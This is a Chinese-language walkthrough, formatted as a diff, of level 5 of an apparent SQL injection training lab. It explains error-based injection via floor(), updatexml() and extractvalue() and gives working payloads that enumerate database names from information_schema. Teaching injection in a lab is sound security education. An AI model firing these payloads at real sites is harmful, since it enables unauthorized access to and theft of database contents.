@@ -1,0 +1,38 @@
+下面是第五关的通关讲解：
+1.经错测试发现，当输入?id=3时页面显示正常，当输入?id=486页面显示如下
+说明页面没有显示位。无法使用联合查询注入
+2.接着我们尝试在URL中输入  ?id=2' 页面出现错误语句如下：
+页面出现SQL语句报错，在这里我们就可以使用一种新的注入方式：报错注入
+首先介绍三种报错注入常用的语句：
+(1). 通过floor报错
+and (select 1 from (select count(*),concat((payload),floor (rand(0)*2))x from information_schema.tables group by x)a)
+其中payload为你要插入的SQL语句
+需要注意的是该语句将 输出字符长度限制为64个字符
+
+(2). 通过updatexml报错
+and updatexml(1,payload,1)
+同样该语句对输出的字符长度也做了限制，其最长输出32位
+并且该语句对payload的反悔类型也做了限制，只有在payload返回的不是xml格式才会生效
+
+(3). 通过ExtractValue报错
+and extractvalue(1, payload)
+输出字符有长度限制，最长32位。
+
+payload即我们要输入的sql查询语句
+
+3.在这里我们使用floor报错语句进行注入
+?id=2' and (select 1 from (select count(*),concat(((select group_concat(schema_name) from information_schema.schemata)),
+floor (rand(0)*2))x from information_schema.tables group by x)a) --+
+这里发现页面提示我输出信息超过一行，但我们已经使用了group_concat函数，说明这里数据库名组成的字符串长度超过了64位，所以我们需要放弃group_concat函数，
+而使用limit 0,1来一个个输出
+group_concat()函数的作用：将返回信息拼接成一行显示
+limit 0,1  表示输出第一个数据。   0表示输出的起始位置，1表示跨度为1（即输出几个数据，1表示输出一个，2就表示输出两个）
+接着我们运用如下语句：
+and (select 1 from (select count(*),concat(((select schema_name from information_schema.schemata limit 0,1)),
+floor (rand(0)*2))x from information_schema.tables group by x)a) --+
+需要注意的是，此时数据库名并不是 information_schema1
+这个1是floor报错语句中输出的也一部分（无论输出什么结果，都会有这个1）
+为了防止某些时候，我们误以为这个1也是我们查询结果的一部分，我建议大家使用一个；与它分开，语句如下：
+?id=2' and (select 1 from (select count(*),concat(((select concat(schema_name,';') from information_schema.schemata limit 0,1)),
+floor (rand(0)*2))x from information_schema.tables group by x)a) --+
+下面我们更该我们的payload一个个的查询我们要找的数据即可，这里不再演示
